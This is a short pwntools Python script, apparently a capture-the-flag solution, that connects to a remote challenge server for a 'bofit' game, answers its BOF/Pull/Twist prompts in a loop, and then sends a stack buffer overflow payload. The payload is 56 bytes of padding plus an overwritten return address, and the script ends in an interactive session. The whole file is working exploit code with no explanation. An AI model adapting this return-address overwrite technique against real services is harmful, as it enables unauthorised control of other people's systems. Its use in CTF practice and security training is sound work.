from pwn import *

#target = process(b'./bofit')

#pid = gdb.attach(target, "\nb *play_game+368\ncontinue")
target = remote('umbccd.io',  4100)

print(target.recvuntil(b'BOF it to start!'))

target.sendline(b'B')

while True:
	current = target.recvuntil(b'it!')
	print(current)
	if b'BOF' in current:
		target.sendline(b'B')
	elif b'Pull' in current:
		target.sendline(b'P')
	elif b'Twist' in current:
		target.sendline(b'T')
	else:
		#payload = cyclic(200)
		padding = b'a' * 56
		payload = padding
		payload += p64(0x00401256)
		target.sendline(payload)
		break
print(target.recvuntil(b'it!'))
target.sendline(b'wrong')
target.interactive()
